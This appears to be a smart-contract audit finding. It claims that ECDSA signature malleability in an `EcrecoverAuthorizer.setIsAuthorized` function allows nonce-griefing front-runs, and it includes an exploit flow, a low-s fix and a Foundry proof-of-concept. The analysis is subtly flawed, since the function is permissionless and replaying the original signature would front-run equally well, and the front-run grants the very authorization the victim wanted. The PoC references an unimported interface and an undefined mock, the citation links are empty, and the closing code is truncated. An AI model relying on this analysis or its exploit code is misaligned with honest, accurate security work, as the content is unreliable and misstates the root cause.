### Title
ECDSA Signature Malleability Enables Nonce-Griefing Front-Run on `setIsAuthorized` - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` uses raw `ecrecover` at line 31 without enforcing a low-s constraint. Because secp256k1 ECDSA produces two valid signatures per message — `(v, r, s)` and `(v^1, r, n−s)` — any unprivileged attacker who observes a pending `setIsAuthorized` transaction in the mempool can compute the malleable counterpart and front-run it, consuming the victim's nonce. The victim's original transaction then reverts with `InvalidNonce`, and any bundled operations that depended on it executing atomically are permanently blocked for that nonce.

### Finding Description

**Code path:** [1](#0-0) 

Line 26 checks and increments the nonce atomically: [2](#0-1) 

Line 31 calls raw `ecrecover` with no low-s enforcement: [3](#0-2) 

The function has no `msg.sender` restriction — this is explicitly by design and confirmed by the permissionless test: [4](#0-3) 

**Root cause:** secp256k1 ECDSA allows two valid signatures for any message/key pair: `(v, r, s)` and `(v XOR 1, r, secp256k1_order − s)`. Both pass `ecrecover` and return the same signer address. Without a `require(uint256(s) <= 0x7FFFFFFF...FFFF, ...)` low-s guard, both are accepted.

**Exploit flow:**
1. Victim signs `Authorization{authorizer=V, authorized=X, isAuthorized=true, nonce=N, deadline=D}` and broadcasts `setIsAuthorized(auth, sig_original)`.
2. Attacker observes the pending tx in the mempool, extracts `(v, r, s)`, computes `s' = secp256k1_order − s`, `v' = v ^ 1`.
3. Attacker submits `setIsAuthorized(auth, Signature{v', r, s'})` with higher gas — same `auth` struct, malleable signature.
4. Attacker's tx executes first: nonce check passes (`nonce[V] == N`), nonce incremented to `N+1`, `ecrecover` returns `V`, authorization is set.
5. Victim's tx executes: `nonce[V] == N+1` but `auth.nonce == N` → `InvalidNonce()` revert.

**Why existing checks fail:**
- `require(signer != address(0))` — both signatures produce the same non-zero signer; passes.
- `require(signer == authorization.authorizer || isAuthorized(...))` — same signer recovered; passes.
- The nonce is consumed by the attacker's tx before the victim's tx can execute.

### Impact Explanation

The victim's `setIsAuthorized` transaction reverts with `InvalidNonce`. If the victim submitted the authorization as part of an atomic bundle via `MidnightBundles` (e.g., authorize a protective contract and immediately invoke it to repay debt or withdraw collateral before liquidation), the entire bundle fails. The victim must re-sign with nonce `N+1` and resubmit — but the attacker can repeat the front-run indefinitely, permanently preventing the victim from executing time-sensitive bundled operations. In the liquidation-protection scenario, this window can result in the victim's position being liquidated while they are unable to authorize and invoke their protective contract atomically. [5](#0-4) 

### Likelihood Explanation

**Preconditions:** Victim broadcasts a `setIsAuthorized` transaction (common operation). Attacker monitors the public mempool (standard capability). No special role or funds required — any unprivileged address can call `setIsAuthorized`.

**Feasibility:** Computing `s' = n − s` and `v' = v ^ 1` is trivial off-chain arithmetic. The attack is repeatable for every nonce the victim attempts to use, making it a persistent griefing vector. On chains with a public mempool (Ethereum mainnet, most L2s), this is straightforwardly executable.

### Recommendation

Add a low-s check immediately after `ecrecover`, matching the EIP-2 / OpenZeppelin ECDSA standard:

```solidity
uint256 constant SECP256K1_ORDER_HALF = 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0;

require(uint256(signature.s) <= SECP256K1_ORDER_HALF, MalleableSignature());
address signer = ecrecover(digest, signature.v, signature.r, signature.s);
```

This ensures each `(r, s)` pair has exactly one canonical form, making the malleable counterpart invalid and eliminating the front-run vector.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {EcrecoverAuthorizer} from "../src/periphery/EcrecoverAuthorizer.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract MalleabilityGriefTest is Test {
    uint256 constant SECP256K1_ORDER =
        0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    EcrecoverAuthorizer authorizer;
    address midnight; // mock

    function setUp() public {
        // deploy with a mock midnight that accepts all setIsAuthorized calls
        midnight = address(new MockMidnight());
        authorizer = new EcrecoverAuthorizer(midnight);
    }

    function testMalleableSigFrontRunGriefs() public {
        uint256 victimKey = 0xDEAD;
        address victim = vm.addr(victimKey);

        Authorization memory auth = Authorization({
            authorizer: victim,
            authorized: address(0xBEEF),
            isAuthorized: true,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });

        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(authorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimKey, digest);

        // Attacker computes malleable signature
        uint8 vMalleable = v == 27 ? 28 : 27;
        bytes32 sMalleable = bytes32(SECP256K1_ORDER - uint256(s));

        // Assert both recover to the same signer
        address signerOriginal = ecrecover(digest, v, r, s);
        address signerMalleable = ecrecover(digest, vMalleable, r, sMalleable);
        assertEq(signerOriginal, victim);
        assertEq(signerMalleable, victim); // malleable sig recovers same address

        // Attacker front-runs with malleable sig
        authorizer.setIsAuthorized(auth, Signature({v: vMalleable, r: r, s: sMalleable}));
        assertEq(authorizer.nonce(victim), 1); // nonce consumed

        // Victim's original tx now reverts
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        authorizer.setIsAuthorized(auth, Signature({v: v, r: r, s: s}));
    }
}
```

**Expected assertions:**
- `ecrecover(digest, vMalleable, r, sMalleable) == victim` — malleability is real.
- `authorizer.nonce(victim) == 1` after attacker's tx — nonce consumed.
- Victim's tx reverts with `InvalidNonce` — griefing confirmed.

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),

        );
